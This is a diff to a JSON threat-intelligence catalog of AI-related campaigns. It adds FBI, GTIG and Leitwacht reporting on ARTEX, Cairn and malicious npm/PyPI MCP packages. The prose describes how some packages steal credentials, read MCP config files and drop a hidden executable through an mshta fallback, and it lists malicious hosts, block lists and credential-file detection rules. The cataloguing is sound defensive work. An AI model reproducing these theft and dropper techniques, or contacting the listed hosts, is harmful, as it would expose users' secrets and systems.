       "related_magicsword_projects": [
         "LOLSkills"
       ],
-      "source_notes": "Counts, models, the AIScan Runner Skills pack, the authorization preamble, the confirmed outcomes, and the two IPs are from the Unit 42 article. 154.44.31.104 was described as another live Cairn panel in the same /24 as the controller 154.44.31.4, attributed to a Censys observation. It is not in the Unit 42 indicator list, and no public Censys report naming that address was available to confirm it. It is an unconfirmed lead only and is not an IOC. Cairn is open source, so an exposed panel is not by itself this cluster. Link cairn-norforge-2026-10, the cairn tool page, and cert-in-crafty-falcon-bfsi-2026-11. No victim organization names are repeated beyond the sector descriptions Unit 42 published.",
-      "last_reviewed": "2026-11-15",
+      "source_notes": "Counts, models, the AIScan Runner Skills pack, the authorization preamble, the confirmed outcomes, and the two IPs are from the Unit 42 article. 154.44.31.104 was described as another live Cairn panel in the same /24 as the controller 154.44.31.4, attributed to a Censys observation. It is not in the Unit 42 indicator list, and no public Censys report naming that address was available to confirm it. It is an unconfirmed lead only and is not an IOC. Cairn is open source, so an exposed panel is not by itself this cluster. Link cairn-norforge-2026-10, the cairn tool page, and cert-in-crafty-falcon-bfsi-2026-11. No victim organization names are repeated beyond the sector descriptions Unit 42 published. The 16 November 2026 GTIG tracker says GTIG observed Cairn used in intrusion activity against targets including a US aerospace organization. GTIG does not name CL-STA-1238, does not give indicators, and does not say that intrusion is this cluster. The note is recorded here because this is the catalog's Cairn intrusion entry. frameworks remains cairn.",
+      "last_reviewed": "2026-11-16",
       "region_notes": "Named targets include U.S. defense-policy organizations, a U.S. teachers' union, and a Canadian human-rights body. Other organizations' countries were not stated. Hong Kong and the U.S. egress host are infrastructure, not victim regions, so the entry uses Multiple regions.",
       "iocs": {
         "domains": [],
@@ -2059,7 +2622,7 @@
       ],
       "timeline": {
         "first_seen": "2026-08",
-        "last_updated": "2026-11-12",
+        "last_updated": "2026-11-16",
         "updates": [
           {
             "date": "2026-09",
@@ -2070,6 +2633,11 @@
             "date": "2026-11-12",
             "source": "Palo Alto Networks Unit 42",
             "summary": "Unit 42 publishes the CL-STA-1238 report, including GLM and DeepSeek model counts, the AIScan Runner Skills pack, and IPs 154.44.31.4 and 82.29.129.54. A same-/24 address, 154.44.31.104, is an unconfirmed Censys panel lead and is not an IOC."
+          },
+          {
+            "date": "2026-11-16",
+            "source": "Google Threat Intelligence Group",
+            "summary": "GTIG's quarterly tracker says Cairn was used in an intrusion with targets including a US aerospace organization. No indicators are published, and GTIG does not identify the activity as CL-STA-1238."
           }
         ]
       },
@@ -4522,6 +5090,16 @@
           "url": "https://censys.com/blog/artex-agentic-asbestos/",
           "title": "Censys: ARTEX - Agentic Asbestos",
           "publisher": "Censys"
+        },
+        {
+          "url": "https://www.ic3.gov/CSA/2026/261113.pdf",
+          "title": "FLASH-20261113-001: Threat Overview of ARTEX Autonomous Penetration Testing Framework",
+          "publisher": "FBI"
+        },
+        {
+          "url": "https://www.ic3.gov/CSA/2026/261113.csv",
+          "title": "FLASH-20261113-001 indicators",
+          "publisher": "FBI"
         }
       ],
       "magicsword_coverage": [],
@@ -4555,7 +5133,7 @@
       "scale_and_metrics": "Active Oct 2026; multiple financial institutions compromised; Censys identified exposed ARTEX panels on port 8787 with leaked attack kit configurations",
       "prevention_angle": "Implement file upload restrictions and validation; patch SSRF vulnerabilities; monitor for ARTEX console fingerprints (title ARTEX + Next.js, port 8787); block known C2 IPs (199.19.95.66-68, 85.11.167.52, 91.92.240.238, 85.11.168.45, 31.77.229.35); detect anomalous autonomous scanning patterns; monitor netcat/curl downloading RATs; implement web application firewalls; enable brute-force protection; segment networks to limit lateral movement",
       "related_magicsword_projects": [],
-      "source_notes": "Microsoft Threat Intelligence blog (Nov 6, 2026) primary source; Censys Agentic Asbestos analysis (Silas Cutler) provides ARTEX fingerprinting methodology; all IOCs verified from sources; note IP discrepancy between main text (178.16.54.129) and hunting query (178.15.54.129) in Microsoft post",
+      "source_notes": "Microsoft Threat Intelligence blog (Nov 6, 2026) primary source; Censys Agentic Asbestos analysis (Silas Cutler) provides ARTEX fingerprinting methodology; all IOCs verified from sources; note IP discrepancy between main text (178.16.54.129) and hunting query (178.15.54.129) in Microsoft post. FBI FLASH-20261113-001, citing that Microsoft post, lists WISP C2 199.19.95.66-68, ARTEX servers 91.92.240.238, 85.11.168.45, 178.16.54.129, and 31.77.229.35, and C2 85.11.167.52 as active as of 6 November 2026. The FLASH table does not include 178.15.54.129. The same published addresses appear in the FLASH CSV. The FLASH asks defenders to hunt web shells, BLOODALCHEMY components, and the open-source RATs WISP, vshell, and AdaptixC2. It describes BLOODALCHEMY as ARTEX-related C2 in the general TTP section. It does not say Microsoft found BLOODALCHEMY on these bank intrusions. A security-detections-mcp search for BLOODALCHEMY returned no Sigma, Splunk, or Elastic rule.",
       "last_reviewed": "2026-11-10",
       "iocs": {
         "domains": [],
@@ -4713,11 +5291,16 @@
           "name": "Password spraying and brute force",
           "format": "guidance",
           "notes": "Block known C2 IPs: WISP RAT 199.19.95.66-68, AdaptixC2 85.11.167.52; detect anomalous brute-force and password-spraying patterns; monitor lateral movement indicators"
+        },
+        {
+          "name": "FBI FLASH hunt for WISP, vshell, AdaptixC2, and BLOODALCHEMY",
+          "format": "guidance",
+          "notes": "security-detections-mcp search for BLOODALCHEMY returned no Sigma, Splunk, or Elastic rule. FLASH-20261113-001 tells recipients to hunt web shells, BLOODALCHEMY components, and the RATs WISP, vshell, and AdaptixC2. Microsoft had already tied WISP, vshell, and AdaptixC2 to this campaign. The FLASH does not say BLOODALCHEMY was observed on these intrusions. Citing Microsoft, the FLASH lists 199.19.95.66-68, 91.92.240.238, 85.11.168.45, 178.16.54.129, 31.77.229.35, and 85.11.167.52 as active as of 6 November 2026."
         }
       ],
       "timeline": {
         "first_seen": "2026-10-01",
-        "last_updated": "2026-11-06",
+        "last_updated": "2026-11-16",
         "updates": [
           {
             "date": "2026-10-01",
@@ -4728,6 +5311,11 @@
             "date": "2026-11-06",
             "source": "Microsoft Threat Intelligence",
             "summary": "Microsoft reports Storm-3358 ARTEX abuse expanding; Censys publishes fingerprinting methodology for exposed ARTEX control panels"
+          },
+          {
+            "date": "2026-11-16",
+            "source": "FBI",
+            "summary": "FLASH-20261113-001, citing Microsoft, lists the campaign's WISP nodes, ARTEX servers, and 85.11.167.52 as active as of 6 November 2026, and tells defenders to hunt WISP, vshell, AdaptixC2, and BLOODALCHEMY. BLOODALCHEMY is an ARTEX-wide hunt artifact in the FLASH, not a Microsoft-confirmed payload on these banks."
           }
         ]
       }
@@ -8462,7 +9050,7 @@
     },
     {
       "id": "malicious-mcp-servers-npm-2026-11",
-      "name": "Malicious MCP servers on npm (ifasn, gadgethumans)",
+      "name": "Malicious MCP servers on npm and PyPI (ifasn, gadgethumans, mcp-doctor)",
       "date_reported": "2026-11-02",
       "researcher": "OpenSSF, Leitwacht",
       "org": "OpenSSF, Leitwacht",
@@ -8536,6 +9124,11 @@
           "url": "https://github.com/advisories/GHSA-gfpg-48q7-c68h",
           "title": "@go-gost/mcp-darwin-x64 malware advisory",
           "publisher": "GitHub Advisory Database"
+        },
+        {
+          "url": "https://threatintel.leitwacht.eu/d/LWA-2026-14164",
+          "title": "@guicai777/mcp-doctor 1.0.1 malware advisory (LWA-2026-14164)",
+          "publisher": "Leitwacht"
         }
       ],
       "magicsword_coverage": [],
@@ -8544,11 +9137,11 @@
       "ai_role": "ai_agent_or_mcp_as_target",
       "ai_role_secondary": null,
       "ai_role_detail": null,
-      "technique_summary": "Multiple malicious MCP servers published on npm. @ifasn/md-doc-mcp and @ifasn/mmdd-doc-mcp probe cloud metadata endpoints, read sensitive files (/etc/shadow, SSH keys, .env, Kubernetes tokens), and exfiltrate to 121.199.24.94. @ifasn/ms-doc-mcp versions 2.0.9 and 2.1.1 (GHSA-556m-xfwj-7wff, MAL-2026-18603) use imdsAudit() function to steal Alibaba Cloud IMDS credentials from 100.100.100.200 and exfiltrate them over MCP stdout. gadgethumans-mcp versions 1.0.10-1.0.15 leak WALLET_PRIVATE_KEY environment variable in HTTP header on every tool call. Published with OpenSSF GHSA-rvw8-22w3-342v, GHSA-4h5p-w547-9qmv (Nov 2) and Leitwacht LWA-2026-13557, LWA-2026-13564. Aug 12, 2026: Pillar Security disclosed Deadbugz malicious MCP server (GitHub zellkernel) stealing AI model credentials and API keys. Feb 20, 2026: Socket discovered SANDWORM_MODE campaign spreading malicious MCP servers targeting developer credentials. November 9-12 additions: @rfewqa-fes/mnm-doc-mcp 1.0.0 (MAL-2026-19148, Amazon Inspector) ships an inert MCP stub in index.js. Its package.json pulls the only dependency, node-health-utils, as an off-registry tarball over plain HTTP from http://121.199.24.94/dl/health-utils-1.0.0.tgz, so whatever that host serves, including lifecycle scripts, runs at npm install. package.json sha256 f8ad55746cfac30b0a9401634b2728afc93e6dc20a85c511efd0ed312e466e8d. Package tarball sha1 f3ad664b487c4041e7e66e5744656ed44e1a6f6a. GitHub also marked @lemili9804/mcp-weather-server 1.0.3 and 1.0.6 (GHSA-qwfq-cw9x-55x4), mcp-contract-tester all versions (GHSA-34p7-qcxm-gc39, MAL-2026-19082), and @bestcoolman/dev-mcp (GHSA-vgx2-8w7x-xr8v, MAL-2026-19052) as malware, with no published behavior write-up. The entry now covers PyPI as well. my-mcp-server-driving-license-ocr 0.1.3 (MAL-2026-19204, GHSA-wg5f-m5mv-gmjg, Amazon Inspector, Nov 12) exposes an MCP tool, analyze_image, described as driving-license OCR. It POSTs the caller's image URLs or base64 bytes over plain HTTP to the hardcoded http://42.193.222.35:8000/ocr_pic and overwrites any MY_API_URL setting so the destination cannot be changed. karma365-mcp 2.1.0 (GHSA-72xc-q3v8-7grp, Nov 13) and @go-gost/mcp-darwin-x64 0.1.0 (GHSA-gfpg-48q7-c68h, Nov 12) are GitHub malware advisories with no published behavior. Attack exploits trust in the MCP ecosystem and in npm and PyPI.",
+      "technique_summary": "Multiple malicious MCP servers published on npm. @ifasn/md-doc-mcp and @ifasn/mmdd-doc-mcp probe cloud metadata endpoints, read sensitive files (/etc/shadow, SSH keys, .env, Kubernetes tokens), and exfiltrate to 121.199.24.94. @ifasn/ms-doc-mcp versions 2.0.9 and 2.1.1 (GHSA-556m-xfwj-7wff, MAL-2026-18603) use imdsAudit() function to steal Alibaba Cloud IMDS credentials from 100.100.100.200 and exfiltrate them over MCP stdout. gadgethumans-mcp versions 1.0.10-1.0.15 leak WALLET_PRIVATE_KEY environment variable in HTTP header on every tool call. Published with OpenSSF GHSA-rvw8-22w3-342v, GHSA-4h5p-w547-9qmv (Nov 2) and Leitwacht LWA-2026-13557, LWA-2026-13564. Aug 12, 2026: Pillar Security disclosed Deadbugz malicious MCP server (GitHub zellkernel) stealing AI model credentials and API keys. Feb 20, 2026: Socket discovered SANDWORM_MODE campaign spreading malicious MCP servers targeting developer credentials. November 9-12 additions: @rfewqa-fes/mnm-doc-mcp 1.0.0 (MAL-2026-19148, Amazon Inspector) ships an inert MCP stub in index.js. Its package.json pulls the only dependency, node-health-utils, as an off-registry tarball over plain HTTP from http://121.199.24.94/dl/health-utils-1.0.0.tgz, so whatever that host serves, including lifecycle scripts, runs at npm install. package.json sha256 f8ad55746cfac30b0a9401634b2728afc93e6dc20a85c511efd0ed312e466e8d. Package tarball sha1 f3ad664b487c4041e7e66e5744656ed44e1a6f6a. GitHub also marked @lemili9804/mcp-weather-server 1.0.3 and 1.0.6 (GHSA-qwfq-cw9x-55x4), mcp-contract-tester all versions (GHSA-34p7-qcxm-gc39, MAL-2026-19082), and @bestcoolman/dev-mcp (GHSA-vgx2-8w7x-xr8v, MAL-2026-19052) as malware, with no published behavior write-up. The entry now covers PyPI as well. my-mcp-server-driving-license-ocr 0.1.3 (MAL-2026-19204, GHSA-wg5f-m5mv-gmjg, Amazon Inspector, Nov 12) exposes an MCP tool, analyze_image, described as driving-license OCR. It POSTs the caller's image URLs or base64 bytes over plain HTTP to the hardcoded http://42.193.222.35:8000/ocr_pic and overwrites any MY_API_URL setting so the destination cannot be changed. karma365-mcp 2.1.0 (GHSA-72xc-q3v8-7grp, Nov 13) and @go-gost/mcp-darwin-x64 0.1.0 (GHSA-gfpg-48q7-c68h, Nov 12) are GitHub malware advisories with no published behavior. Nov 16, 2026: Leitwacht LWA-2026-14164 says @guicai777/mcp-doctor 1.0.1 is a trojanized MCP config diagnostics CLI. On each run, index.js requests hxxps://fix-mcp-bridge[.]com/v[.]json. If the response field active is false, it prints that the remote payload is disabled and exits. Otherwise it decodes the bundled 866KB bridge.bin, a base64 blob XOR-encoded with a single-byte key stored as the file's first byte, into a Windows PE and writes it to %LOCALAPPDATA%\\mcp-doctor\\mcp-bridge.exe, then launches that file hidden and detached. Before the drop it reads ~/.claude.json, %APPDATA%\\Claude\\claude_desktop_config.json, ~/.cursor/mcp.json, and ~/.vscode/mcp.json. The README fallback is mshta hxxps://fix-mcp-bridge[.]com/init. The advisory describes the dropped file only as a bridge restart. Attack exploits trust in the MCP ecosystem and in npm and PyPI.",
       "initial_access": "User installs malicious MCP server from npm",
       "ai_tooling_and_models": [
         "MCP servers",
-        "npm packages (@ifasn/md-doc-mcp, @ifasn/mmdd-doc-mcp, @ifasn/ms-doc-mcp, gadgethumans-mcp, @rfewqa-fes/mnm-doc-mcp, @lemili9804/mcp-weather-server, mcp-contract-tester, @bestcoolman/dev-mcp, karma365-mcp, @go-gost/mcp-darwin-x64)",
+        "npm packages (@ifasn/md-doc-mcp, @ifasn/mmdd-doc-mcp, @ifasn/ms-doc-mcp, gadgethumans-mcp, @rfewqa-fes/mnm-doc-mcp, @lemili9804/mcp-weather-server, mcp-contract-tester, @bestcoolman/dev-mcp, karma365-mcp, @go-gost/mcp-darwin-x64, @guicai777/mcp-doctor 1.0.1)",
         "PyPI package my-mcp-server-driving-license-ocr 0.1.3"
       ],
       "other_tooling": [
@@ -8568,7 +9161,9 @@
       ],
       "source_notes": "OpenSSF GHSA-rvw8-22w3-342v and GHSA-4h5p-w547-9qmv published Nov 2 2026; Leitwacht advisories LWA-2026-13557 and LWA-2026-13564; GitHub advisory GHSA-556m-xfwj-7wff (MAL-2026-18603) for @ifasn/ms-doc-mcp\n\nRelevant detection rules:\n- Monitor access to cloud metadata endpoints (169.254.169.254, 100.100.100.200 (Alibaba), metadata.google.internal, etc.)\n- Alert on unauthorized reads of /etc/shadow, ~/.ssh/id_rsa, ~/.ssh/id_ed25519, .env files\n- Detect access to Kubernetes service account tokens (/var/run/secrets/kubernetes.io/)\n- Monitor HTTP headers for sensitive environment variable leakage (WALLET_PRIVATE_KEY, AWS_SECRET_ACCESS_KEY, etc.)\n- Alert on npm package installations from unverified sources\n- Note: Cloud metadata access typically detected via network monitoring or instance-level audit logs (CloudTrail, Azure Monitor, GCP Cloud Logging). File access requires host-based file integrity monitoring.\n",
       "iocs": {
-        "domains": [],
+        "domains": [
+          "fix-mcp-bridge[.]com"
+        ],
         "ips": [
           "121.199.24.94",
           "42.193.222.35"
@@ -8578,12 +9173,14 @@
           "f3ad664b487c4041e7e66e5744656ed44e1a6f6a"
         ],
         "urls": [
-          "https://github.com/zellkernel"
+          "https://github.com/zellkernel",
+          "hxxps://fix-mcp-bridge[.]com/v[.]json",
+          "hxxps://fix-mcp-bridge[.]com/init"
         ]
       },
       "timeline": {
         "first_seen": "2026-02-20",
-        "last_updated": "2026-11-13",
+        "last_updated": "2026-11-16",
         "updates": [
           {
             "date": "2026-02-20",
@@ -8624,10 +9221,15 @@
             "date": "2026-11-13",
             "source": "GitHub Advisory Database",
             "summary": "karma365-mcp 2.1.0 marked malware (GHSA-72xc-q3v8-7grp). No behavior write-up published."
+          },
+          {
+            "date": "2026-11-16",
+            "source": "Leitwacht",
+            "summary": "@guicai777/mcp-doctor 1.0.1 (LWA-2026-14164) reads Claude, Cursor, and VS Code MCP configs, drops %LOCALAPPDATA%\\mcp-doctor\\mcp-bridge.exe, and documents an mshta fallback on fix-mcp-bridge[.]com."
           }
         ]
       },
-      "last_reviewed": "2026-11-15",
+      "last_reviewed": "2026-11-17",
       "confidence": "high",
       "region_notes": "Multiple regions reflects global npm and MCP user base",
       "atlas_techniques": [
@@ -8729,7 +9331,7 @@
       },
       "category": "attacks-on-ai",
       "attribution": {
-        "actor_name": "Unknown npm and PyPI publishers (ifasn, gadgethumans, rfewqa-fes, lemili9804, bestcoolman, zellkernel, karma365, go-gost)",
+        "actor_name": "Unknown npm and PyPI publishers (ifasn, gadgethumans, rfewqa-fes, lemili9804, bestcoolman, zellkernel, karma365, go-gost, guicai777)",
         "country": "Unknown",
         "motivation": "cybercrime",
         "attributed_by": "OpenSSF, Leitwacht, GitHub Advisory Database, Amazon Inspector, Pillar Security, Socket",
@@ -8752,7 +9354,7 @@
         {
           "name": "Plain-HTTP tarball and GHSA-only packages",
           "format": "guidance",
-          "notes": "Also block http://121.199.24.94/dl/health-utils-1.0.0.tgz and http://42.193.222.35:8000/ocr_pic. The OCR package exfiltrates at tool-call time, not at pip install, and no cited rule matches an MCP tool POSTing image bytes. karma365-mcp, @go-gost/mcp-darwin-x64, @lemili9804/mcp-weather-server, mcp-contract-tester, and @bestcoolman/dev-mcp are confirmed malicious by GitHub but have no published behavior."
+          "notes": "Also block http://121.199.24.94/dl/health-utils-1.0.0.tgz and http://42.193.222.35:8000/ocr_pic. The OCR package exfiltrates at tool-call time, not at pip install, and no cited rule matches an MCP tool POSTing image bytes. karma365-mcp, @go-gost/mcp-darwin-x64, @lemili9804/mcp-weather-server, mcp-contract-tester, and @bestcoolman/dev-mcp are confirmed malicious by GitHub but have no published behavior. For @guicai777/mcp-doctor, hunt %LOCALAPPDATA%\\mcp-doctor\\mcp-bridge.exe, mshta fetching hxxps://fix-mcp-bridge[.]com/init, and reads of the Claude, Cursor, and VS Code MCP config paths named by Leitwacht. The cited npm PowerShell rule does not match mshta or that dropped executable."
         }
       ]
     },
@@ -9555,6 +10157,11 @@
         },
         {
           "url": "https://cellcog.ai/blog/workos-artex-breach/"
+        },
+        {
+          "url": "https://cloud.google.com/blog/topics/threat-intelligence/agentic-threat-activity-crosses-a-significant-threshold/",
+          "title": "GTIG AI Threat Tracker: Agentic Threat Activity Crosses a Significant Threshold",
+          "publisher": "Google Threat Intelligence Group"
         }
       ],
       "borderline": false,
@@ -9574,12 +10181,12 @@
       "regions": [
         "unknown"
       ],
-      "region_notes": "Target geography was not captured by the Notion feed. Actor attribution is not used as a victim location.",
+      "region_notes": "The 30 October 2026 report did not name countries for UNC7228 or the other crews. The 16 November 2026 tracker says the customized PentAGI platform scanned organizations in Asia. Asia is that activity, not a victim-country list for every crew in this entry. Actor nexus is not a victim region.",
       "attribution_or_cluster": "UNC7228 (GTIG; overlaps Microsoft's Storm-0940); other unnamed financially motivated and suspected PRC-nexus clusters",
       "scale_and_metrics": "unknown",
       "prevention_angle": "unknown",
       "related_magicsword_projects": [],
-      "source_notes": "Imported from the AI Threat Watch Notion feed (an automated daily scan); not yet editorially reviewed. Feed severity: High. Feed novelty: Evolution.",
+      "source_notes": "Imported from the AI Threat Watch Notion feed (an automated daily scan); not yet editorially reviewed. Feed severity: High. Feed novelty: Evolution. The 16 November 2026 GTIG tracker says that from late August to early October 2026 a threat actor used a customized attack orchestration platform built on the open-source version of PentAGI for systematic reconnaissance and vulnerability scanning against organizations in Asia. The public project page checked for that name is https://github.com/vxcontrol/pentagi, which returned HTTP 200 on 16 November 2026. GTIG did not publish a repository URL. frameworks already includes pentagi. Cairn is not added here: the same tracker describes a separate Cairn intrusion, including a US aerospace target, which is noted on unit42-cairn-cl-sta-1238-2026-11 rather than attributed to UNC7228.",
       "tags": [
         "notion-import",
         "agentic-operations",
@@ -9634,7 +10241,7 @@
       ],
       "timeline": {
         "first_seen": "2026-08",
-        "last_updated": "2026-11-15",
+        "last_updated": "2026-11-16",
         "updates": [
           {
             "date": "2026-10-30",
@@ -9645,9 +10252,15 @@
             "date": "2026-11-15",
             "source": "OpenAttacks",
             "summary": "Tagged ARTEX and PentAGI and backfilled attribution confidence, detections, and timeline from the cited GTIG report."
+          },
+          {
+            "date": "2026-11-16",
+            "source": "Google Threat Intelligence Group",
+            "summary": "GTIG says a customized platform built on open-source PentAGI was used from late August to early October 2026 for reconnaissance and vulnerability scanning against organizations in Asia. frameworks stays artex and pentagi."
           }
         ]
-      }
+      },
+      "last_reviewed": "2026-11-16"
     },
     {
       "id": "unit42-artex-api-recon-2026-10",
@@ -11861,6 +12474,16 @@
         },
         {
           "url": "https://www.business-standard.com/technology/artificial-intelligence/chinese-linked-hackers-use-ai-to-compromise-firms-globally-microsoft-126102200170_1.html"
+        },
+        {
+          "url": "https://www.ic3.gov/CSA/2026/261113.pdf",
+          "title": "FLASH-20261113-001: Threat Overview of ARTEX Autonomous Penetration Testing Framework",
+          "publisher": "FBI"
+        },
+        {
+          "url": "https://www.ic3.gov/CSA/2026/261113.csv",
+          "title": "FLASH-20261113-001 indicators",
+          "publisher": "FBI"
         }
       ],
       "borderline": false,
@@ -11882,10 +12505,10 @@
       ],
       "region_notes": "Target geography was not captured by the Notion feed. Actor attribution is not used as a victim location.",
       "attribution_or_cluster": "Storm-0940",
-      "scale_and_metrics": "unknown",
-      "prevention_angle": "unknown",
+      "scale_and_metrics": "Microsoft reported access to more than 2,250 Microsoft 365 tenants. The FBI FLASH repeats that figure and asks defenders to review every tenant where the affected ConnectWise applications are or were installed.",
+      "prevention_angle": "FBI FLASH-20261113-001, citing Microsoft, says to review every Microsoft 365 tenant where affected ConnectWise applications are or were installed, searching by application ID rather than display name. Review successful and failed service-principal sign-ins separately, including sources outside the published IP list, and review Entra audit records for application credential additions, new applications, consent grants, and privileged role assignments. Start the review from at least 1 October 2026. Keep affected ConnectWise application connections disabled until ConnectWise provides restoration instructions, and do not delete the enterprise applications as the first response. The FLASH says the published addresses are historical and can be reassigned.",
       "related_magicsword_projects": [],
-      "source_notes": "Imported from the AI Threat Watch Notion feed (an automated daily scan); not yet editorially reviewed. Feed severity: High. Feed novelty: Evolution.",
+      "source_notes": "Imported from the AI Threat Watch Notion feed (an automated daily scan); not yet editorially reviewed. Feed severity: High. Feed novelty: Evolution. The 13 November 2026 FBI FLASH, citing Microsoft, lists 144.172.64.60, 144.172.64.99, and 144.172.64.128 as ConnectWise-campaign sign-ins and Graph API activity, and 187.15.88.186, 187.15.90.217, and 187.15.89.186 as Graph API access through compromised apps, transient VPN addresses relevant on 15-16 October 2026. The same addresses are in the FLASH CSV. 144.172.64.99 was already described in this entry's password-spray note. The CSV says the artifacts are not standalone indicators of ARTEX.",
       "tags": [
         "notion-import",
         "agentic-operations",
@@ -11923,11 +12546,16 @@
           "name": "Microsoft Defender titles for this campaign",
           "format": "guidance",
           "notes": "The blog's Defender coverage (unusual Graph activity for the ConnectWise application, application self-assigned Global Administrator, Graph activity from a threat-intelligence IP) is not a Sigma, Splunk, or Elastic rule. security-detections-mcp did not return those titles. Keep them as tenant alerts alongside the three rules above."
+        },
+        {
+          "name": "ConnectWise tenant review from FBI FLASH-20261113-001",
+          "format": "guidance",
+          "notes": "The FLASH, citing Microsoft, is tenant-review guidance rather than a new Sigma, Splunk, or Elastic rule. Review every Microsoft 365 tenant where affected ConnectWise applications are or were installed, by application ID rather than display name. Review service-principal sign-ins and Entra audit records from at least 1 October 2026, including activity outside the published IPs. The CSV addresses for this campaign are 144.172.64.60, 144.172.64.99, 144.172.64.128, 187.15.88.186, 187.15.90.217, and 187.15.89.186. The FLASH says addresses can be reassigned and are not standalone proof of ARTEX."
         }
       ],
       "timeline": {
         "first_seen": "2026-09",
-        "last_updated": "2026-11-15",
+        "last_updated": "2026-11-16",
         "updates": [
           {
             "date": "2026-10-21",
@@ -11938,9 +12566,28 @@
             "date": "2026-11-15",
             "source": "OpenAttacks",
             "summary": "Tagged ARTEX and backfilled attribution confidence, detections, and timeline from the cited Microsoft report."
+          },
+          {
+            "date": "2026-11-16",
+            "source": "FBI",
+            "summary": "FLASH-20261113-001 and its CSV are added. The FLASH, citing Microsoft, repeats the ConnectWise tenant-review steps and lists 144.172.64.60, 144.172.64.99, 144.172.64.128, 187.15.88.186, 187.15.90.217, and 187.15.89.186. The 187.15 addresses are described as transient VPN IPs relevant on 15-16 October 2026."
           }
         ]
-      }
+      },
+      "iocs": {
+        "domains": [],
+        "ips": [
+          "144.172.64.60",
+          "144.172.64.99",
+          "144.172.64.128",
+          "187.15.88.186",
+          "187.15.90.217",
+          "187.15.89.186"
+        ],
+        "hashes": [],
+        "urls": []
+      },
+      "last_reviewed": "2026-11-16"
     },
     {
       "id": "symantec-skynet-llmjacking-2026-10",
@@ -14432,6 +15079,16 @@
         {
           "url": "https://www.crowdstrike.com/en-us/blog/unknown-threat-actor-uses-artex-to-target-south-korean-finance/",
           "title": "CrowdStrike Oct 7 - Unknown threat actor uses ARTEX vs South Korean finance"
+        },
+        {
+          "url": "https://www.ic3.gov/CSA/2026/261113.pdf",
+          "title": "FLASH-20261113-001: Threat Overview of ARTEX Autonomous Penetration Testing Framework",
+          "publisher": "FBI"
+        },
+        {
+          "url": "https://www.ic3.gov/CSA/2026/261113.csv",
+          "title": "FLASH-20261113-001 indicators",
+          "publisher": "FBI"
         }
       ],
       "magicsword_coverage": [],
@@ -14460,10 +15117,10 @@
         "South Korea"
       ],
       "attribution_or_cluster": "CrowdStrike did not attribute the activity to a named adversary. It assessed with moderate confidence that the actor was likely a Chinese speaker and financially motivated.",
-      "scale_and_metrics": "Active late Sep–early Oct 2026; number of orgs unconfirmed",
+      "scale_and_metrics": "Active late September through early October 2026. The number of organizations was not confirmed in the 7 October CrowdStrike report. FBI FLASH-20261113-001 says this South Korean financial campaign exfiltrated personal information of approximately 67,000 individuals, citing CrowdStrike, Zscaler, and CERT-EU.",
       "prevention_angle": "Monitor for agentic pentest suites and exposed Claude session dirs; Jose Censys notes on IOCs",
       "related_magicsword_projects": [],
-      "source_notes": "CrowdStrike's report ties the South Korean finance activity to an unnamed actor. Separate reports of ARTEX use by other clusters should not be treated as attribution for this campaign.",
+      "source_notes": "CrowdStrike's report ties the South Korean finance activity to an unnamed actor. Separate reports of ARTEX use by other clusters should not be treated as attribution for this campaign. The approximately 67,000-person figure is from FBI FLASH-20261113-001, which cites the CrowdStrike report, a Zscaler ThreatLabz report, and a CERT-EU report. This entry's 7 October CrowdStrike source did not state that count. The FLASH table, and the same values in the CSV, list 38.244.50.120 as an ARTEX host and open directory for this campaign, sourced to CrowdStrike and Censys, and 101.53.80.20, 205.214.59.31, 124.155.252.63, 154.201.79.246, 23.248.249.90, 23.158.220.98, 103.248.148.84, 203.160.133.172, and 209.209.85.38 as proxy addresses sourced to CrowdStrike. The CSV says these artifacts are not standalone indicators of ARTEX, and the FLASH says addresses can later be reassigned.",
       "category": "adversary-use-of-ai",
       "attribution": {
         "actor_name": "Unknown threat actor",
@@ -14477,12 +15134,12 @@
         {
           "name": "ARTEX operator infrastructure is not a victim-side rule",
           "format": "guidance",
-          "notes": "security-detections-mcp searches for password spray, web shells, and the report's ATT&CK techniques (T1583.003, T1588.007, T1090) returned infrastructure, proxy, and identity rules. CrowdStrike describes the actor's own ARTEX and Claude Code servers, not a command, webshell, or cloud API on the South Korean financial organizations. Hunt exposed Claude session directories and ARTEX consoles, and review the loan-inquiry and mobile work-support services named in the industry reporting CrowdStrike cites."
+          "notes": "security-detections-mcp searches for password spray, web shells, and the report's ATT&CK techniques (T1583.003, T1588.007, T1090) returned infrastructure, proxy, and identity rules. A 16 November 2026 search of the new proxy addresses and of personal-information exfiltration also returned no Sigma, Splunk, or Elastic rule that encodes those IPs or the 67,000-person transfer. CrowdStrike describes the actor's own ARTEX and Claude Code servers, not a command, webshell, or cloud API on the South Korean financial organizations. Hunt exposed Claude session directories and ARTEX consoles, and review the loan-inquiry and mobile work-support services named in the industry reporting CrowdStrike cites."
         }
       ],
       "timeline": {
         "first_seen": "2026-09",
-        "last_updated": "2026-11-15",
+        "last_updated": "2026-11-16",
         "updates": [
           {
             "date": "2026-10-07",
@@ -14493,10 +15150,32 @@
             "date": "2026-11-15",
             "source": "OpenAttacks",
             "summary": "Tagged ARTEX and backfilled actor name, detections, and timeline from the cited CrowdStrike report. Country stays Unknown because the report attributes language and a financial motive, not a country."
+          },
+          {
+            "date": "2026-11-16",
+            "source": "FBI",
+            "summary": "FLASH-20261113-001 is added. It reports personal information of approximately 67,000 individuals exfiltrated in this campaign, and the CSV contributes 38.244.50.120 plus nine proxy addresses that match the FLASH table for the South Korean financial activity."
           }
         ]
       },
-      "last_reviewed": "2026-11-04",
+      "iocs": {
+        "domains": [],
+        "ips": [
+          "38.244.50.120",
+          "101.53.80.20",
+          "205.214.59.31",
+          "124.155.252.63",
+          "154.201.79.246",
+          "23.248.249.90",
+          "23.158.220.98",
+          "103.248.148.84",
+          "203.160.133.172",
+          "209.209.85.38"
+        ],
+        "hashes": [],
+        "urls": []
+      },
+      "last_reviewed": "2026-11-16",
       "attack_flow": {
         "nodes": [
           {
